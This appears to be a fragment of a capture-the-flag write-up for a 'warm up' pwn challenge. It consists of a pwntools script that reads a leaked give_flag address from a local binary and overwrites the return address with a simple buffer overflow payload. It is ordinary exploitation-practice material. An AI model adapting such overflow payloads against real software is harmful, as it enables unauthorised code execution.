## Pwn

### warm up

trivial

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./challenge')
r.recvuntil('give_flag = ')
bd = int(r.recvline()[:-1], 16)
print(hex(bd))
r.sendline(b'A'*0x14 + p32(bd))

r.interactive()
```

